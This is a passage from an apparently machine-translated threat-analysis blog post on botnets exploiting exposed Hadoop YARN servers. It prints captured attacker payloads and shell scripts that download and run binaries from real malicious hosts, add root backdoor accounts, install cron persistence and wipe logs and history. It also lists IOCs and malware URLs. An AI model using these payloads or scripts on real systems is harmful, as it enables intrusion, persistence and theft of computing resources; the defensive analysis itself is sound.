"application_XXXXXXXXXXXXX_XXXX", "application-type": "YARN", "application-name": "get-shell"}</span></pre><p id="7ea1" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">下载的脚本“n”包含下载两个二进制文件的代码，一个32位x86，一个64位x86:</p><pre class="kg kh ki kj fq ma mb mc md aw me dt"><span id="193d" class="mf kt hu mb b fv mg mh l mi mj">$ cat n<br/>#!/bin/sh<br/>n="Supra.x86 Supra.x86_64"<br/>http_server="80.211.59.125" <br/>dirs="/tmp/ /var/ /dev/shm/ /dev/ /var/run/ /var/tmp/"<br/> <br/>for dir in $dirs<br/>do<br/>    &gt;$dir.file &amp;&amp; cd $dir<br/>done <br/> <br/>for i in $n<br/>do<br/>    cp $SHELL $i<br/>    &gt;$i<br/>    chmod 777 $i<br/>    wget http://$http_server/$i -O $i<br/>    chmod 777 $i<br/>    ./$i<br/>done</span></pre><p id="cae7" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">查看下载的“Supra.x86_64”二进制文件的字符串，我们看到与DemonBot的字符串非常匹配，未剥离的二进制文件中的修饰名也是如此。</p><pre class="kg kh ki kj fq ma mb mc md aw me dt"><span id="3063" class="mf kt hu mb b fv mg mh l mi mj">$ strings Supra.x86_64<br/>…<br/>80.211.59.125:434<br/>8.8.8.8<br/>/proc/net/route<br/>…<br/>x86_64<br/>Linux<br/>/usr/bin/apt-get<br/>Ubuntu/Debian<br/>/usr/lib/portage<br/>Gentoo<br/>/usr/bin/yum<br/>RHEL/CentOS<br/>/usr/share/YaST2<br/>OpenSUSE<br/>/etc/dropbear/<br/>OpenWRT<br/>/etc/opkg<br/>UNKNOWN<br/>/etc/ssh/<br/>Dropbear<br/>/etc/xinet.d/telnet<br/>Telnet<br/>/usr/kerberos/bin/telnet<br/>…<br/>[1;37m[<br/>[0;35mSupra<br/>[1;37m]<br/>[0;35m--&gt;<br/>[1;37m[<br/>[0;35m%s<br/>[1;37m]<br/>[0;35m--&gt;<br/>[1;37m[<br/>[0;35m%s<br/>[1;37m]<br/>[0;35m--&gt;<br/>[1;37m[<br/>[0;35m%s<br/>[1;37m]<br/>[0;35m--&gt;<br/>[1;37m[<br/>[0;35m%s<br/>[1;37m]<br/>[0;35m--&gt;<br/>[1;37m[<br/>[0;35m%s<br/>[1;37m]<br/>…<br/>GCC: (GNU) 4.2.1   <br/>…</span></pre><p id="9036" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">请注意，该字符串与之前在DemonBot源代码中发现的非常相似，但这次在第一个方括号中使用了“Supra”而不是“shell ”:</p><pre class="kg kh ki kj fq ma mb mc md aw me dt"><span id="3ec8" class="mf kt hu mb b fv mg mh l mi mj">[<strong class="mb hv">Supra</strong>]–&gt;[%s]–&gt;[%s]–&gt;[%s]–&gt;[%s]–&gt;[%s]</span></pre><p id="3cad" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">新的二进制代码还包含平台检测代码中扩展的指示符。最初的DemonBot检查了两个平台</p><ul class=""><li id="3fbe" class="jq jr hu it b iu iv iy iz jc js jg jt jk ju jo jv jw jx jy dt translated">Ubuntu/Debian，基于/usr/bin/apt-get的存在，以及</li><li id="ec9d" class="jq jr hu it b iu jz iy ka jc kb jg kc jk kd jo jv jw jx jy dt translated">RHEL/Centos，基于/usr/bin/yum的存在</li></ul><p id="43e6" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">上文补充了以上两点:</p><ul class=""><li id="f5d3" class="jq jr hu it b iu iv iy iz jc js jg jt jk ju jo jv jw jx jy dt translated">Gentoo: /usr/lib/portage</li><li id="d0e6" class="jq jr hu it b iu jz iy ka jc kb jg kc jk kd jo jv jw jx jy dt translated">OpenSUSE: /usr/share/YaST2</li><li id="77bc" class="jq jr hu it b iu jz iy ka jc kb jg kc jk kd jo jv jw jx jy dt translated">OpenWRT: /etc/dropbear</li><li id="e87d" class="jq jr hu it b iu jz iy ka jc kb jg kc jk kd jo jv jw jx jy dt translated">未知:/etc/opkg</li><li id="6a21" class="jq jr hu it b iu jz iy ka jc kb jg kc jk kd jo jv jw jx jy dt translated">Dropbear: /etc/ssh/</li><li id="dc40" class="jq jr hu it b iu jz iy ka jc kb jg kc jk kd jo jv jw jx jy dt translated">Telnet: /etc/xinet.d/telnet</li></ul><p id="6d42" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">用于这个DemonBot版本的编译版本与最初的DemonBot: GCC (GNU) 4.2.1相同。</p><h1 id="69ba" class="ks kt hu bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp dt translated">Hoho，希腊的僵尸网络。艾里奥斯</h1><p id="63d7" class="pw-post-body-paragraph ir is hu it b iu lq iw ix iy lr ja jb jc ls je jf jg lt ji jj jk lu jm jn jo hn dt translated">Hadoop YARN exploit有效负载:</p><pre class="kg kh ki kj fq ma mb mc md aw me dt"><span id="f747" class="mf kt hu mb b fv mg mh l mi mj">{"am-container-spec": {"commands": {"command": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://68.183.96[.]48/bins/hoho.x86 -O /tmp/flex; chmod +x /tmp/flex; /tmp/flex servers"}}, "application-id": "application_XXXXXXXXXXXXX_XXXX", "application-type": "YARN", "application-name": "get-shell"}</span></pre><p id="71e5" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">二进制文件于2018年10月30日首次出现在服务器上:</p><figure class="kg kh ki kj fq kk fe ff paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="fe ff mp"><img src="../Images/081c3e5e31a769fa80089d77ebe31bdc.png" data-original-src="https://miro.medium.com/v2/resize:fit:844/format:webp/1*Xb-j54INTiDEkIhRwG3RKw.png"/></div></div></figure><p id="1765" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">hoho.x86二进制文件包含文字字符串:</p><pre class="kg kh ki kj fq ma mb mc md aw me dt"><span id="80be" class="mf kt hu mb b fv mg mh l mi mj">Botnet Made By greek.Helios</span></pre><p id="d3c8" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">二进制文件用UPX可执行打包器打包，主要匹配Mirai未来组合代码。</p><pre class="kg kh ki kj fq ma mb mc md aw me dt"><span id="13fb" class="mf kt hu mb b fv mg mh l mi mj">IOC<br/> <br/>7812fc4e894712845559193bd2b9cc88391b0a6691906124846cbaf73eb67b73 hoho.arm 622dd9dc905a14d881ce07227252f5086ba3b7afca88b913ece0bcfb4444b41b hoho.arm5 b9e0cce5412c1cb64f6e53493c8263f5e0d56e6e217ea4d94e401bf2da6d8c60 hoho.arm6 7050cb141e5eb0a8236639e0d9f2cc9bca63f2c3984b3ea8e30400984d24cfe6 hoho.arm7 4ce21713f20624ea5ba9eec606c53b7d9c38c2d72abf4043f509c81326bbdb1d hoho.m68k 485ecbe80f8f98b032af80cf32bb26d49e1071c75b25f6e306e37856f1446d38 hoho.mips a599bf6697062d3358b848db40399feafd65931834acc9228f97dc27aa7fa4bb hoho.mpsl 456b31214698f894e8f4eb4aa01a34305c713df526fd33db74b58f440e59a863 hoho.ppc e0a56e2ea529991933c38fc8159374c8821fdb57fe5622c2cf8b5ad7798bbc02 hoho.sh4 da53b60354c3565a9954cbaa0e1b6d7146d56890ee10cd0745b5787298db97a7 hoho.spc<br/>9f4f93667e4892ca84a45981caafb4a39eabdc2f6c257f0dc2df04c73f1bf0a4 hoho.x86</span></pre><h1 id="bee7" class="ks kt hu bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp dt translated">prax0zma.ru</h1><p id="c350" class="pw-post-body-paragraph ir is hu it b iu lq iw ix iy lr ja jb jc ls je jf jg lt ji jj jk lu jm jn jo hn dt translated">该活动由一组外壳脚本组成，可从受损服务器上删除系统和其他用户帐户，并创建两个具有根用户权限的后门帐户。</p><p id="e23a" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">后门帐户用户名为“VM”和“localhost ”,两者的密码都设置为哈希“$ 1 $ owj j0 fjv $ rmdaylph 3 xpxhxfpbe 8s 1”。</p><pre class="kg kh ki kj fq ma mb mc md aw me dt"><span id="59d9" class="mf kt hu mb b fv mg mh l mi mj">http://prax0zma[.]ru/8.sh<br/>$ cat 8.sh<br/>export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin<br/><br/>echo "*/5 * * * * curl -fsSL http://prax0zma[.]ru/8.sh | sh" &gt; /var/spool/cron/root<br/>echo "*/5 * * * * wget -q -O- http://prax0zma[.]ru/8.sh | sh" &gt;&gt; /var/spool/cron/root<br/>#echo "0 * * * * pkill -9 r" &gt;&gt; /var/spool/cron/root<br/>mkdir -p /var/spool/cron/crontabs<br/>echo "*/5 * * * * curl -fsSL http://prax0zma[.]ru/8.sh | /bin/sh" &gt; /var/spool/cron/crontabs/root<br/>echo "*/5 * * * * wget -q -O- http://prax0zma[.]ru/8.sh | /bin/sh" &gt;&gt; /var/spool/cron/crontabs/root<br/>#echo "0 * * * * pkill -9 r" &gt;&gt; /var/spool/cron/crontabs/root<br/><br/>cd /boot ; wget -q http://hehe.suckmyass[.]cf/.o -O .b; chmod +x .b; nohup ./.b  &gt;/dev/null 2&gt;&amp;1<br/>cd /boot ; curl -O http://hehe.suckmyass[.]cf/.o ; chmod +x .o; nohup ./.o  &gt;/dev/null 2&gt;&amp;1<br/>#cd /tmp ; curl -O http://sandbotc2[.]ml/fefe | wget -q http://sandbotc2[.]ml/fefe ; chmod +x fefe; ./fefe ; rm -rf fefe*; &gt;/dev/null 2&gt;&amp;1<br/>echo 128 &gt; /proc/sys/vm/nr_hugepages<br/>sysctl -w vm.nr_hugepages=128<br/>    ulimit -n 65000<br/>    ulimit -u 65000<br/><br/>mkdir -p /tmp/.ha/<br/><br/>if [ ! -f "/tmp/.ha/nsyhs" ]; then<br/>    curl -fsSL http://prax0zma[.]ru/bash -o /tmp/.ha/nsyhs<br/>fi<br/><br/>if [ ! -f "/tmp/.ha/nsyhs" ]; then<br/>    wget -q http://prax0zma[.]ru/bash -O /tmp/.ha/nsyhs<br/>fi<br/><br/>chmod +x /tmp/.ha/nsyhs &amp;&amp; /tmp/.ha/nsyhs</span><span id="f179" class="mf kt hu mb b fv mo mh l mi mj">----<br/>http://hehe.suckmyass[.]cf/.o <br/>$ cat .o<br/>cd /boot ; wget -q http://r00ts.truthdealmodz[.]pw/.i -O .0; chmod +x .0; nohup ./.0  &gt;/dev/null 2&gt;&amp;1 ; rm -rf .0<br/>cd /boot ; curl -O http://r00ts.truthdealmodz[.]pw/.i ; chmod +x .i; nohup ./.i  &gt;/dev/null 2&gt;&amp;1 ; rm -rf .i<br/>userdel -f bash &gt;/dev/null 2&gt;&amp;1<br/>userdel -f ssh &gt;/dev/null 2&gt;&amp;1<br/>userdel -f butter &gt;/dev/null 2&gt;&amp;1<br/>userdel -f r00t &gt;/dev/null 2&gt;&amp;1<br/>userdel -f axiga &gt;/dev/null 2&gt;&amp;1<br/>userdel -f cats &gt;/dev/null 2&gt;&amp;1<br/>userdel -f python &gt;/dev/null 2&gt;&amp;1<br/>userdel -f Word &gt;/dev/null 2&gt;&amp;1<br/>userdel -f fxmeless &gt;/dev/null 2&gt;&amp;1<br/>userdel -f yandex &gt;/dev/null 2&gt;&amp;1<br/>userdel -f synx &gt;/dev/null 2&gt;&amp;1<br/>userdel -f syncs &gt;/dev/null 2&gt;&amp;1<br/>userdel -f oracles &gt;/dev/null 2&gt;&amp;1<br/>userdel -f cubes &gt;/dev/null 2&gt;&amp;1<br/>userdel -f wwww &gt;/dev/null 2&gt;&amp;1<br/>userdel -f http  &gt;/dev/null 2&gt;&amp;1<br/>userdel -f R00T  &gt;/dev/null 2&gt;&amp;1<br/>userdel -f z  &gt;/dev/null 2&gt;&amp;1<br/>userdel -f r000t  &gt;/dev/null 2&gt;&amp;1<br/>userdel -f ssshd  &gt;/dev/null 2&gt;&amp;1<br/>userdel -f vps  &gt;/dev/null 2&gt;&amp;1<br/>userdel -f Duck &gt;/dev/null 2&gt;&amp;1<br/>userdel -f x &gt;/dev/null 2&gt;&amp;1<br/>userdel -f redisserver &gt;/dev/null 2&gt;&amp;1<br/>userdel -f admins &gt;/dev/null 2&gt;&amp;1<br/>userdel -f halts &gt;/dev/null 2&gt;&amp;1<br/>useradd -u 0 -g 0 -o -l -d /root -N -M -p '$1$OwJj0Fjv$RmdaYLph3xpxhxxfPBe8S1' VM &gt;/dev/null 2&gt;&amp;1<br/>useradd -u 0 -g 0 -o -l -d /root -N -M -p '$1$OwJj0Fjv$RmdaYLph3xpxhxxfPBe8S1' localhost &gt;/dev/null 2&gt;&amp;1<br/>#rm -rf /tmp/.*<br/>rm -rf /var/tmp/.z<br/>rm -rf /tmp/.FILE<br/>rm -rf /tmp/.xm<br/>rm -rf /tmp/.iokb21<br/>rm -rf /tmp/.bzc bzc.tgz*<br/>rm -rf /var/tmp/.xm.log<br/>pkill -9 56545<br/>pkill -9 Word<br/>pkill -9 "  "<br/>pkill -9 xds<br/>pkill -9 httpd.conf<br/>pkill -9 yam<br/>pkill -9 xd<br/>pkill -9 .syslog<br/>pkill -9 wipefs<br/>pkill -9 " "<br/>pkill -9 auditd<br/>pkill -9 crondb<br/>pkill -9 syn<br/>pkill -9 xnetd<br/>pkill -9 ld-linux-x86-64<br/>pkill -9 xm64<br/>pkill -9 xm32<br/>pkill -9 kthreadd<br/>pkill -9 watchdogs<br/>pkill -9 xmrig64<br/>pkill -9 xig<br/>pkill -9 ps<br/>pkill -9 minerd<br/>pkill -9 smh64<br/>pkill -9 system.usermn<br/>pkill -9 skrt<br/>pkill -9 .xm.log<br/>pkill -9 zjgw<br/>pkill -9 SSHer<br/>pkill -9 SSher<br/>pkill -9 xm<br/>pkill -f ld-linux-x86-64<br/>pkill -f xm64<br/>pkill -f xm32<br/>pkill -f xig<br/>pkill -f minerd<br/>pkill -f ps<br/>pkill -f .xm<br/>/etc/init.d/crond start<br/>service crond start<br/>iptables -I INPUT -s 185.234.217.11 -j DROP<br/>iptables -A INPUT -s 185.234.217.11 -j REJECT cd /boot ; wget -q http://hehe.suckmyass[.]cf/.o -O .b; chmod +x .b; nohup ./.b  &gt;/dev/null 2&gt;&amp;1<br/>cd /boot ; curl -O http://hehe.suckmyass[.]cf/.o ; chmod +x .o; nohup ./.o  &gt;/dev/null 2&gt;&amp;1<br/>#cd /tmp ; curl -O http://sandbotc2[.]ml/fefe | wget -q http://sandbotc2[.]ml/fefe ; chmod +x fefe; ./fefe ; rm -rf fefe*; &gt;/dev/null 2&gt;&amp;1<br/>echo 128 &gt; /proc/sys/vm/nr_hugepages<br/>sysctl -w vm.nr_hugepages=128<br/>    ulimit -n 65000<br/>    ulimit -u 65000<br/><br/>mkdir -p /tmp/.ha/<br/><br/>if [ ! -f "/tmp/.ha/nsyhs" ]; then<br/>    curl -fsSL http://prax0zma[.]ru/bash -o /tmp/.ha/nsyhs<br/>fi<br/><br/>if [ ! -f "/tmp/.ha/nsyhs" ]; then<br/>    wget -q http://prax0zma[.]ru/bash -O /tmp/.ha/nsyhs<br/>fi<br/><br/>chmod +x /tmp/.ha/nsyhs &amp;&amp; /tmp/.ha/nsyhs</span><span id="26ff" class="mf kt hu mb b fv mo mh l mi mj">----<br/>http://r00ts.truthdealmodz.pw/.i <br/>$ cat .i<br/>#!/bin/bash<br/><br/>useradd -u 0 -g 0 -o -l -d /root -M -p '$1$OwJj0Fjv$RmdaYLph3xpxhxxfPBe8S1' localhost &gt;/dev/null 2&gt;&amp;1<br/>useradd -u 0 -g 0 -o -l -d /root -M -p '$1$OwJj0Fjv$RmdaYLph3xpxhxxfPBe8S1' VM &gt;/dev/null 2&gt;&amp;1<br/>useradd -u 0 -g 0 -o -l -d /root -N -M -p '$1$OwJj0Fjv$RmdaYLph3xpxhxxfPBe8S1' localhost &gt;/dev/null 2&gt;&amp;1<br/>useradd -u 0 -g 0 -o -l -d /root -N -M -p '$1$OwJj0Fjv$RmdaYLph3xpxhxxfPBe8S1' VM &gt;/dev/null 2&gt;&amp;1<br/>echo -e '#!/bin/sh\n\nwget --quiet http://r00ts.truthdealmodz[.]pw/.o -O- 3&gt;/dev/null|sh&gt;/dev/null 2&gt;&amp;1' &gt; /etc/cron.hourly/0;chmod +x /etc/cron.hourly/0;<br/><br/>echo -e '#!/bin/sh\n\nwget --quiet http://r00ts.truthdealmodz[.]pw/.o -O- 3&gt;/dev/null|sh&gt;/dev/null 2&gt;&amp;1' &gt; /etc/cron.daily/0;chmod +x /etc/cron.daily/0;<br/><br/>echo -e '#!/bin/sh\n\nwget --quiet http://r00ts.truthdealmodz[.]pw/.o -O- 3&gt;/dev/null|sh&gt;/dev/null 2&gt;&amp;1' &gt; /etc/cron.weekly/0;chmod +x /etc/cron.weekly/0;<br/><br/>echo -e '#!/bin/sh\n\nwget --quiet http://r00ts.truthdealmodz[.]pw/.o -O- 3&gt;/dev/null|sh&gt;/dev/null 2&gt;&amp;1' &gt; /etc/cron.monthly/0;chmod 777 /etc/cron.monthly/0;<br/><br/>echo -e '#!/bin/sh\n\nwget --quiet http://r00ts.truthdealmodz[.]pw/.o -O- 3&gt;/dev/null|sh&gt;/dev/null 2&gt;&amp;1' &gt; /etc/rc.local;chmod +x /etc/rc.local;<br/>head -c -384 /var/log/wtmp &gt; .wtmp; mv .wtmp /var/log/wtmp; chmod 664 /var/log/wtmp; chown root:utmp /var/log/wtmp; chmod 777 /etc/cron.*/* ;<br/>history -c;<br/>unset history;history -w</span></pre><h1 id="f24f" class="ks kt hu bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp dt translated">恶意软件动物园</h1><p id="f0b2" class="pw-post-body-paragraph ir is hu it b iu lq iw ix iy lr ja jb jc ls je jf jg lt ji jj jk lu jm jn jo hn dt translated">表(*1)中的Hadoop YARN漏洞提供了一个真实的Linux物联网恶意软件动物园——大多数二进制文件都与Mirai未来组合相关——这并不奇怪…</p><p id="2866" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">仍处于活动状态的链接:</p><pre class="kg kh ki kj fq ma mb mc md aw me dt"><span id="f7ab" class="mf kt hu mb b fv mg mh l mi mj"><a class="ae ke" href="http://167.88.161.40/yarn.x86" rel="noopener ugc nofollow" target="_blank">http://167.88.161[.]40/yarn.x86</a><br/> 2eab746dea07b3b27fb6582ee100a7ee732d7980012652da6d705f4e90c4196b yarn.x86 <br/><a class="ae ke" href="http://185.244.25.150/bins/otaku.x86" rel="noopener ugc nofollow" target="_blank">http://185.244.25[.]150/bins/otaku.x86</a><br/> 34ee8efb22814660dd7d2a4d1219b73fd1a2c4ba63ef99020f135980551419b5 otaku.x86 <br/>http://185.244.25[.]163/8×868<br/> a5beb685f7847009485b94cc7f91eb16254ccd681c60cec5928f5a22c23acb55 8×868 <br/><a class="ae ke" href="http://185.244.25.222/x86" rel="noopener ugc nofollow" target="_blank">http://185.244.25[.]222/x86</a><br/> 4b18997cc8fa26092d3b6de7fce637a4bc80a9c35997248035208144108c6ebd x86 <br/><a class="ae ke" href="http://185.244.25.251/x86" rel="noopener ugc nofollow" target="_blank">http://185.244.25[.]251/x86</a><br/> 33f54d0afccfdc0a8b0428d7a1fca20079fe760b21e3750e31a8cba1b862e104 x86 <br/><a class="ae ke" href="http://167.99.51.231/x86" rel="noopener ugc nofollow" target="_blank">http://167.99.51[.]231/x86</a><br/> 83777b500163259e9e1b7a4801b5c3ad48708511b1c2b7573e344985011396c6 x86 <br/><a class="ae ke" href="http://46.17.47.198/bins/kowai.x86" rel="noopener ugc nofollow" target="_blank">http://46.17.47[.]198/bins/kowai.x86</a><br/> 1a447b4e33474e693517a5a1b26e18c5a0dc8de3e92b57f2402f098218327c60 kowai.x86</span><span id="524e" class="mf kt hu mb b fv mo mh l mi mj">http://94.177.231[.]48/sh<br/>$ cat sh<br/>#!/bin/sh<br/><br/>binarys="mips mpsl arm arm5 arm6 arm7 sh4 ppc x86 arc"<br/>server_ip="94.177.231.48"<br/>binname="miori"<br/>execname="loliloli"<br/><br/>for arch in $binarys<br/>do<br/>    cd /tmp<br/>    wget http://$server_ip/$binname.$arch -O $execname<br/>    #tftp -g -l $execname -r $binname.$arch $server_ip<br/>    chmod 777 $execname<br/>    ./$execname<br/>    rm -rf $execname<br/>done<br/>$ wget http://94.177.231[.]48/miori.x86 <br/><br/>8e7e65105dfa629d695f63c41378f9f10112641a8f5bb9987b1a69b2c7336254  miori.x86</span><span id="aae9" class="mf kt hu mb b fv mo mh l mi mj">http://46.29.165.143/fearless.sh<br/>#!/bin/bash<br/>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.29.165[.]143/fearlessntpd; chmod +x fearlessntpd; ./fearlessntpd; rm -rf fearlessntpd<br/>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.29.165[.]143/fearlesssshd; chmod +x fearlesssshd; ./fearlesssshd; rm -rf fearlesssshd<br/>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.29.165[.]143/fearlessopenssh; chmod +x fearlessopenssh; ./fearlessopenssh; rm -rf fearlessopenssh<br/>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.29.165[.]143/fearlessbash; chmod +x fearlessbash; ./fearlessbash; rm -rf fearlessbash<br/>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.29.165[.]143/fearlesstftp; chmod +x fearlesstftp; ./fearlesstftp; rm -rf fearlesstftp<br/>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.29.165[.]143/fearlesswget; chmod +x fearlesswget; ./fearlesswget; rm -rf fearlesswget<br/>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.29.165[.]143/fearlesscron; chmod +x fearlesscron; ./fearlesscron; rm -rf fearlesscron<br/>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.29.165[.]143/fearlessftp; chmod +x fearlessftp; ./fearlessftp; rm -rf fearlessftp<br/>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.29.165[.]143/fearlesspftp; chmod +x fearlesspftp; ./fearlesspftp; rm -rf fearlesspftp<br/>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.29.165[.]143/fearlesssh; chmod +x fearlesssh; ./fearlesssh; rm -rf fearlesssh<br/>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.29.165[.]143/fearlessshit; chmod +x fearlessshit; ./fearlessshit; rm -rf fearlessshit<br/>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.29.165[.]143/fearlessapache2; chmod +x fearlessapache2; ./fearlessapache2; rm -rf fearlessapache2<br/>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.29.165[.]143/fearlesstelnetd; chmod +x fearlesstelnetd; ./fearlesstelnetd; rm -rf fearlesstelnetd<br/><br/>$ file fearlessapache2 <br/>fearlessapache2: ELF 32-bit LSB executable, ARM, version 1 (ARM), statically linked, stripped<br/><br/>47ace06c5f36937a6d5f4369ea1980a91f570a6d9d9b144e7f5b3f4006316f57  fearlessapache2</span></pre><p id="628d" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">截至本文撰写时，未激活的链接:</p><pre class="kg kh ki kj fq ma mb mc md aw me dt"><span id="cdf0" class="mf kt hu mb b fv mg mh l mi mj">http://185.244.25[.]153/YSDKOP.x86 <br/>http://68.183.96[.]48/bins/hoho.x86 <br/>http://cnc.junoland[.]xyz/x86hua<br/>http://194.147.35[.]63/bins/Kuran.x86<br/>http://46.29.165[.]33/bins/kowai.x86 <br/>http://167.88.161[.]40/bins/mydick <br/>http://188.138.100[.]8/ankit/jno.x86<br/>http://67.205.128[.]131/oxy.x86<br/>http://80.211.94[.]16/Nurasu.x86_64; <br/>http://46.36.37[.]121/weed.sh<br/>http://142.93.152[.]247/8UsA.sh</span></pre><h1 id="7d70" class="ks kt hu bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp dt translated">受损的服务器</h1><p id="44ca" class="pw-post-body-paragraph ir is hu it b iu lq iw ix iy lr ja jb jc ls je jf jg lt ji jj jk lu jm jn jo hn dt translated">了解暴露的服务器后，我们可以通过将服务器IP与我们的全球欺骗网络活动相关联，来评估受到危害的那组服务器的活动。暴露的服务器列表中只有不到5%的服务器与我们的欺骗网络中的服务器重叠，并且已经被发现执行恶意活动。然而，这5%并不是全貌，因为有令人信服的证据表明行为者积极滥用服务器来挖掘加密货币，并且因为没有扫描或利用活动，这些服务器不会出现在我们的欺骗网络中。来自潜在的1065的受损服务器的数量仍然是未知的，但可以肯定地说，在某个时候，所有这些服务器都将成为或已经成为恶意活动的受害者。</p><p id="1217" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">下图显示了已知受损服务器的每个端口的活动。这些活动以TCP端口23、2323、22和2222为目标，这些端口代表了通过telnet和SSH凭据暴力利用的一般物联网漏洞。另一个臭名昭著的端口5555因TR069和ADB利用物联网易受攻击的设备而闻名。在过去7天中，我们发现针对端口23的扫描活动有所增加。</p><figure class="kg kh ki kj fq kk fe ff paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="fe ff mq"><img src="../Images/1a26907115bb63e9917624b1ba217df4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mCv7yZvLi6ER6DINaSvUGQ.png"/></div></div></figure><p id="f1be" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">这种类似于Mirai未来组合的端口23扫描行为主要源自一台服务器，在过去7天内可以进行超过35，000次扫描。其他受损的服务器在有限的时间范围内适用于几个事件。</p><figure class="kg kh ki kj fq kk fe ff paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="fe ff mr"><img src="../Images/0999866ccd960efd4d7f1e9ca8b70e2b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_gaH-3zBliEwec5YnUx3eg.png"/></div></div></figure><p id="788b" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">就受攻击服务器的区域目标而言，德国受到的攻击最多。</p><figure class="kg kh ki kj fq kk fe ff paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="fe ff ms"><img src="../Images/2c269fa3e5f90dda744075c5341d32ad.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UlBOGonDezQyQTJyMnDL0A.png"/></div></div></figure><h1 id="59c0" class="ks kt hu bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp dt translated">当…不是如果</h1><p id="f285" class="pw-post-body-paragraph ir is hu it b iu lq iw ix iy lr ja jb jc ls je jf jg lt ji jj jk lu jm jn jo hn dt translated">虽然有明确的证据表明支持DDoS的僵尸网络试图危害Hadoop YARN暴露的服务器，但没有直接的证据表明被危害的服务器进行了DDoS活动。然而，这并没有消除DDoS攻击的可能性和潜力。攻击面只有1065台服务器多一点。与可以在数十万台设备上运行的物联网僵尸网络相比，这似乎威胁不大。然而，与物联网设备相比，Hadoop(以及一般的云服务器)提供了更好的连接性和更多的计算资源；僵尸网络中只有少数服务器会对在线业务造成严重破坏。</p><p id="1afa" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">对于那些运行Hadoop集群的人来说，公开的YARN服务可能会在某个时候被利用和滥用于密码挖掘。除了影响稳定性和性能，具有弹性计算资源的云服务器还会因为资源利用率的激增而对受害者产生经济影响。</p><p id="4237" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">请注意，您无法逃脱公开暴露的服务，这不是一个如果的问题，而是一个您的服务何时会被损害和滥用的问题。在今天的互联网中，云服务器可以在几分钟内执行完整的互联网端口扫描，而应用程序漏洞扫描不到一天。对于那些还不相信的人，请访问一个(物联网)搜索引擎，如<a class="ae ke" href="https://shodan.io/" rel="noopener ugc nofollow" target="_blank"> https://shodan.io </a>或<a class="ae ke" href="https://fofa.so/" rel="noopener ugc nofollow" target="_blank"> https://fofa.so，</a>，它们每天都在扫描和搜索联网设备。只需在这些搜索引擎的搜索栏中键入“jetty ”,就能见证有多少服务器被编入索引并在几秒钟内被轻松发现。</p><h1 id="7eae" class="ks kt hu bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp dt translated">(*1) Hadoop线程漏洞</h1><figure class="kg kh ki kj fq kk fe ff paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="fe ff mt"><img src="../Images/2d738bdba0cb26cb66230d8d5c74746e.png" 